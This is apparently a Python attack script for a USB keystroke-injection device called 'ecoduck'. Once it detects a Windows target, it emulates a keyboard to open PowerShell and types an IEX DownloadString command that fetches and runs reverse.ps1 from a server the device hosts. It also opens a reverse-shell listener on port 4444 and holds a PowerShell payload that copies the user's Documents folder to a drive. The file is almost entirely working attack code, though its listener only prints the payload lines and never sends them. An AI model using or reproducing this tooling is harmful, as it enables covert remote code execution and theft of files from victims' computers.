from ecoduck import eco

import os,signal,io,http.server,socketserver,socket,time
from time import sleep
from subprocess import Popen, PIPE, check_output

from multiprocessing import Process

shellcode="""$foldername = $env:computername
$mydrive=(GWmi Win32_LogicalDisk | ?{$_.VolumeName -eq 'WINDOWS'} | %{$_.DeviceID})
$destinationFolder = "$mydrive\\$foldername"
if (!(Test-Path -path $destinationFolder)) {New-Item $destinationFolder -Type Directory}
$target = [Environment]::GetFolderPath("MyDocuments")
ls $target
robocopy $target $destinationFolder /E
Write-Host "The file sync is complete." """

def recv_timeout(the_socket,timeout=1): # Receives from socket with a timeout
	the_socket.setblocking(0) # Stops socket from blocking code execution
	total_data="";data='';begin=time.time()
	while 1:
		#if you got some data, then break after wait sec
		if total_data and time.time()-begin>timeout:
			break
		#if you got no data at all, wait a little longer
		elif time.time()-begin>timeout*2:
			break
		try:
			data=the_socket.recv(4096) # recieve data
			if data:
				strdata=data.decode("utf-8") # Decode data to string
				total_data += strdata # Add to total data
				begin=time.time() # Reset timer
			else:
				time.sleep(0.1) # Sleep before checking again
		except:
			pass
	return total_data # Return all data

def reverse_shell_listener():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create our socket handler.
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ;# Set is so that when we cancel out we can reuse port.
	try:
		s.bind(('', 4444)) # Bind to interface.
		print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
		s.listen(10) # Listen for only 10 unaccepted connections.
		conn, addr = s.accept() # Accept connections.
		print("[+] Connected by", addr) # Print connected by ipaddress.
		codelines=shellcode.split("\n")
		for line in codelines:
			print("Sending: " + line)
		print("Letting copy finish")
		sleep(5)
		print("Copy should have finished")
		s.close()
	except KeyboardInterrupt: 
		print("...listener terminated using [ctrl+c], Shutting down!")
		exit() # Using [ctrl+c] will terminate the listener.


def payload(web_dir):
	eco.change_hid()
	connected=False
	print("Waiting for network to come up")
	while(not connected):
		response = os.system("ping -W 1 -c 1 192.168.10.101")
		if(response == 0):
			connected=True
	print("Network up")
	os.chdir(web_dir)
	httpHandler = http.server.SimpleHTTPRequestHandler
	httpd = socketserver.TCPServer(('',8000),httpHandler)
	httplistener=Process(target=httpd.handle_request)
	httplistener.start()
	os.chdir("..")
	for i in range(4):
		eco.press("ESC")
		sleep(0.2)
	eco.press("WIN+d")
	sleep(0.5)
	eco.press("LGUI+r")
	sleep(1)
	eco.type("powershell")
	eco.press("ENTER")
	sleep(1)
	shelllistener=Process(target=reverse_shell_listener)
	shelllistener.start()
	eco.type("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.1:8000/reverse.ps1');\"")
	eco.press("ENTER")
	print("Waiting for shell to exit")
	shelllistener.join()
	print("Shell exited")
	# Copy Documents Directory to Flash Drive
	httpd.server_close()
	httplistener.join(2)
	eco.type("exit")
	eco.press("ENTER")

# Ensures simple gadget is selected
__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
print("Waiting for connection...")
web_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'http'))
while(1):
	if(eco.test_connection("/dev/hidg0", 1)):
		print("Device connected to target")
		# OS Fingerprinting
		detectedos = eco.get_target_os()
		if "Windows" == detectedos:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
		print("HID Path is: " + path)
		print("Target OS is: " + detectedos)
		sleep(2)
		if "Windows" == detectedos:
			payload(web_dir)
		print("Payload completed")
		# Switch back to simple gadget
		if "Windows" == detectedos:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
		else:
			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
		sleep(4)
		eco.wait_for_disconnect()

